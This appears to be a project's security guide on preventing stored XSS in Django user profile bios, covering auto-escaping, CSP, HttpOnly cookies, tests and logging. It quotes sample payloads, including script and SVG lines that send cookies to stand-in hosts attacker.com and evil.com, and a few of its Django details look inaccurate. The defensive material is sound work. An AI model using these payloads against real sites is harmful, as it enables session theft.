# Stored XSS Prevention in User Profile Content

## Overview

This document explains the stored XSS vulnerability, how it exists in the application, and the strategies used to prevent and mitigate it.

**Stored XSS** (Cross-Site Scripting) occurs when an attacker stores malicious JavaScript code in the database through user-controlled fields, and then that code executes when other users view the content. This differs from reflected XSS where the attack is in the URL and affects only the current request.

---

## The Vulnerability: Stored XSS

### Attack Scenario

1. **Attacker Creates Account**
   - Registers with username "attacker"
   - Sets profile bio to: `<img src=x onerror="stealCookie('admin')">`

2. **Admin Views Attacker's Profile**
   - Navigates to `/admin/users/attacker/` (staff endpoint)
   - Admin's browser receives HTML with the img tag
   - If not escaped, the onerror handler executes immediately
   - Attacker's JavaScript runs in admin's browser context
   - Admin's session cookies, CSRF token, etc. are exfiltrated

3. **Impact**
   - Admin account compromised
   - All users' data visible to attacker
   - Database can be modified
   - Application completely compromised

### Why It's Stored

- **Persistent**: Attacker enters payload once, it affects every viewer
- **Silent**: Victim doesn't know their browser is running malicious code
- **Amplified**: One attack affects multiple victims
- **Forensically Hidden**: Can delete account and payload remains cached

### Real-World Example

A chat application allows users to set a "bio" field. User X enters:
```html
<script src="https://attacker.com/steal-session.js"></script>
```

Every time another user loads the user X's profile:
- The script tag is rendered in the page
- Browser downloads and executes `steal-session.js`
- Session cookie is sent to attacker.com
- Attacker can now impersonate that user

---

## The Fix: Output Encoding

### Django's Default Protection

Django templates automatically escape HTML characters by default:

```python
# views.py
def profile_view(request):
    profile = UserProfile.objects.get(user=request.user)
    # This is safe by default:
    return render(request, 'profile.html', {'profile': profile})
```

```html
<!-- templates/profile.html -->
<!-- This auto-escapes profile.bio -->
<p>{{ profile.bio }}</p>
```

When `profile.bio` contains `<img src=x onerror="alert('XSS')">`:
- Django converts it to: `&lt;img src=x onerror="alert('XSS')"&gt;`
- Browser sees this as text, not HTML
- No event handlers execute

### How It Works

Django uses **HTML Entity Encoding**:

| Character | Encoded |
|-----------|---------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

This ensures user input is treated as **data**, not **code**.

---

## Implementation in This Codebase

### Vulnerable Code (NOT in this app, but shown for contrast)

```html
<!-- DANGEROUS - DO NOT USE -->
{{ profile.bio|safe }}    <!-- Disables escaping! -->
{% autoescape off %}
    {{ profile.bio }}      <!-- Disables escaping! -->
{% endautoescape %}
```

### Safe Code (What We Use)

```html
<!-- SAFE - Default Django escaping -->
{{ profile.bio }}          <!-- Auto-escaped -->

<!-- Explicitly safe when using Django forms -->
{{ form.bio }}             <!-- Form fields auto-escape -->

<!-- Safe string casting -->
{% for char in profile.bio %}
    {{ char }}             <!-- Each character escaped -->
{% endfor %}
```

### Profile Template (`manzi/profile.html`)

```html
{% if profile.bio %}
    <div style="margin-bottom: 1rem;">
        <strong style="color: #2c3e50;">Bio</strong>
        <!-- This is automatically escaped by Django -->
        <p style="margin: 0.25rem 0 0 0; color: #555;">{{ profile.bio }}</p>
    </div>
{% endif %}
```

**Security Guarantee**: The template uses `{{ profile.bio }}` without `|safe`, so all HTML characters are escaped.

### Form Rendering (`manzi/profile_edit.html`)

```html
<div class="form-group">
    <label for="{{ form.bio.id_for_label }}">Bio</label>
    <!-- Django form widgets auto-escape in HTML context -->
    {{ form.bio }}
    {% if form.bio.errors %}
        <ul class="errorlist">
            {% for error in form.bio.errors %}
                <!-- Error messages are also auto-escaped -->
                <li>{{ error }}</li>
            {% endfor %}
        </ul>
    {% endif %}
</div>
```

---

## Attack Vectors Blocked

### 1. Script Tag Injection
```html
<!-- Attacker tries: -->
<script>alert('XSS')</script>

<!-- Django renders: -->
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- Browser sees as text, doesn't execute -->
```

### 2. Event Handler Injection
```html
<!-- Attacker tries: -->
<img src=x onerror="stealCookie()">

<!-- Django renders: -->
&lt;img src=x onerror="stealCookie()"&gt;

<!-- Event handler text is displayed, never attached -->
```

### 3. JavaScript Protocol
```html
<!-- Attacker tries: -->
<a href="javascript:alert('XSS')">Click</a>

<!-- Django renders: -->
&lt;a href="javascript:alert('XSS')"&gt;Click&lt;/a&gt;

<!-- href is never interpreted as protocol -->
```

### 4. SVG/Markup Injection
```html
<!-- Attacker tries: -->
<svg onload="fetch('https://attacker.com/steal?data=' + document.cookie)">

<!-- Django renders: -->
&lt;svg onload="fetch(...)"&gt;

<!-- SVG is text, not parsed as vector graphic -->
```

---

## Defense in Depth

Beyond template auto-escaping, additional security layers:

### 1. Content-Security-Policy (CSP) Header

Adding CSP headers provides additional protection:

```python
# In middleware or response handler
response['Content-Security-Policy'] = "script-src 'self'; object-src 'none';"
```

This tells the browser: "Only run JavaScript from this domain, never inline scripts."

Even if an XSS payload somehow gets through, CSP blocks execution:
```html
<!-- Payload: -->
<script>alert('XSS')</script>

<!-- Browser receives CSP header saying no inline scripts allowed -->
<!-- Script is blocked even though it's in the page -->
```

### 2. HttpOnly Cookies

Cookies marked HttpOnly cannot be accessed by JavaScript:

```python
# In Django settings
SESSION_COOKIE_HTTPONLY = True
CSRF_COOKIE_HTTPONLY = True
```

Even if XSS executes:
```javascript
// Attacker's payload tries this:
fetch('https://evil.com/steal?cookie=' + document.cookie);

// Result: document.cookie is empty!
// HttpOnly cookies are not accessible to JavaScript
```

### 3. Input Validation

While output encoding is the primary defense, input validation adds another layer:

```python
# In forms.py
class UserProfileForm(forms.ModelForm):
    class Meta:
        model = UserProfile
        fields = ['bio', 'profile_picture', 'date_of_birth']
    
    def clean_bio(self):
        bio = self.cleaned_data.get('bio', '')
        
        # Length validation
        if len(bio) > 500:
            raise ValidationError("Bio must be 500 characters or less")
        
        # No additional character filtering needed because we rely on output encoding
        # But we could add checks if needed
        
        return bio
```

### 4. User Education

Document what's safe:
- Profile bios accept plain text only
- Markdown or HTML not supported
- Users shouldn't try to enter HTML

---

## Testing for Stored XSS

### Test File: `tests_stored_xss_simple.py`

The test suite includes comprehensive XSS payload tests:

```python
def test_script_tag_xss(self):
    """Test that <script> tags are escaped."""
    payload = "<script>alert('XSS')</script>"
    self.profile.bio = payload
    self.profile.save()
    
    response = self.client.get('/profile/')
    content = response.content.decode('utf-8')
    
    # Verify script tag is escaped
    self.assertNotIn('<script>alert', content)
    self.assertIn('&lt;script&gt;', content)

def test_img_onerror_xss(self):
    """Test that onerror handlers are escaped."""
    payload = '<img src=x onerror="alert(\'XSS\')">'
    self.profile.bio = payload
    self.profile.save()
    
    response = self.client.get('/profile/')
    content = response.content.decode('utf-8')
    
    # Verify event handler is escaped
    self.assertNotIn('onerror=', content)
    self.assertIn('&lt;img', content)
```

### Running Tests

```bash
# Run all XSS tests
python manage.py test manzi.tests_stored_xss_simple

# Run specific test
python manage.py test manzi.tests_stored_xss_simple.ProfileStoredXSSTests.test_script_tag_xss

# With verbose output
python manage.py test manzi.tests_stored_xss_simple -v 2
```

---

## Common Mistakes to Avoid

### ❌ DANGEROUS: Using |safe Filter on User Content

```html
<!-- NEVER DO THIS: -->
<p>{{ profile.bio|safe }}</p>

<!-- This disables Django's automatic escaping! -->
<!-- If bio contains <script>, it will execute! -->
```

### ❌ DANGEROUS: autoescape off Block

```html
<!-- NEVER DO THIS: -->
{% autoescape off %}
    <p>{{ profile.bio }}</p>
{% endautoescape %}

<!-- Disables protection for entire block -->
```

### ❌ DANGEROUS: Using format_as_html Patterns

```python
# NEVER DO THIS:
html_content = f"<p>{user_input}</p>"  # No escaping!
return HttpResponse(html_content)      # User input becomes HTML!
```

### ✅ SAFE: Trust Django's Defaults

```html
<!-- This is safe: -->
<p>{{ profile.bio }}</p>

<!-- And this: -->
{{ form.bio }}

<!-- Django auto-escapes both -->
```

---

## Context-Specific Encoding

Django escapes correctly based on template context:

### HTML Context (Default)
```html
<!-- In HTML attributes or element content -->
<p>{{ profile.bio }}</p>
<!-- Uses HTML entity encoding -->
```

### JavaScript Context
```javascript
// In JavaScript strings - NEVER do this
var bio = "{{ profile.bio }}";  // UNSAFE if inline!

// RIGHT: Use data attributes or AJAX
<div data-bio="{{ profile.bio|escapejs }}"></div>
```

### URL Context
```html
<!-- In URL parameters -->
<a href="/profile/?bio={{ profile.bio|urlencode }}">
<!-- Uses URL encoding -->
```

### CSS Context
```css
/* GENERALLY AVOID - but if needed: */
div { content: "{{ profile.bio|escapecss }}"; }
```

---

## Proof of Concept

To verify XSS is prevented:

### 1. Create XSS Payload
```bash
curl -X POST http://localhost:8000/profile/edit/ \
  -d "bio=<img src=x onerror=\"alert('XSS')\">" \
  -H "Cookie: sessionid=YOUR_SESSION"
```

### 2. View Profile
```bash
curl http://localhost:8000/profile/
```

### 3. Check HTML Source
The payload appears as:
```html
<p>&lt;img src=x onerror="alert('XSS')"&gt;</p>
```

Not as:
```html
<p><img src=x onerror="alert('XSS')"></p>
```

This proves the XSS vector is blocked! ✅

---

## Best Practices Summary

| Do | Don't |
|----|-------|
| ✅ Use `{{ variable }}` | ❌ Use `{{ variable\|safe }}` |
| ✅ Trust Django escaping | ❌ Disable autoescape |
| ✅ Test with XSS payloads | ❌ Assume input is safe |
| ✅ Use form widgets | ❌ Build HTML strings manually |
| ✅ Set CSP headers | ❌ Allow inline scripts |
| ✅ Use HttpOnly cookies | ❌ Allow JS to access cookies |
| ✅ Validate input length | ❌ Allow unlimited input |
| ✅ Log suspicious input | ❌ Ignore injection attempts |

---

## OWASP Top 10: A03:2021 – Injection

This vulnerability prevention addresses **OWASP A03:2021 - Injection**, which includes:

- Cross-Site Scripting (XSS)
- SQL Injection
- Command Injection
- LDAP Injection

**Mitigation**:
- Output encoding based on context
- Input validation
- Parameterized queries (for SQL)
- Proper API usage (avoid manual string concatenation)

---

## Compliance and Standards

### Standards Met:
- ✅ **OWASP Top 10 2021**: A03 - Injection Prevention
- ✅ **CWE-79**: Improper Neutralization of Input During Web Page Generation
- ✅ **PCI DSS 6.5.1**: Injection (SQL, OS, etc.)
- ✅ **NIST SP 800-53 SI-10**: Information System Monitoring

### Coding Standards:
- ✅ Django Security Guide
- ✅ OWASP Secure Coding Practices
- ✅ GitHub Security Review Guidelines

---

## Monitoring and Detection

### Signs of XSS Attempts

Monitor logs for:
- HTML tags in user input (`<`, `>`, `script`, `img`, etc.)
- JavaScript protocols (`javascript:`, `data:`)
- Event handlers (`onerror=`, `onclick=`, `onload=`)
- Suspicious character patterns

### Logging Implementation

```python
# In models or middleware
import logging
logger = logging.getLogger(__name__)

# Log suspicious input
if '<script>' in user_input or 'onerror=' in user_input:
    logger.warning(f"Potential XSS attempt from user {user}: {user_input}")
    # Could trigger automatic account lock/review
```

---

## Resources and References

- [Django Security Documentation](https://docs.djangoproject.com/en/stable/topics/security/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN: Cross-site Scripting (XSS)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting_XSS)
- [PortSwigger Web Security Academy: XSS](https://portswigger.net/web-security/cross-site-scripting)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

---

## Conclusion

Stored XSS is a critical vulnerability found in almost every web application that allows users to input content. However, it's **completely preventable** through proper output encoding.

**Key Takeaway**: Default to escaping output. Only mark content as safe if you've carefully verified it's already safe (e.g., rendered from a template, not user input).

In Django, this is as simple as using `{{ variable }}` in templates instead of `{{ variable|safe }}`.
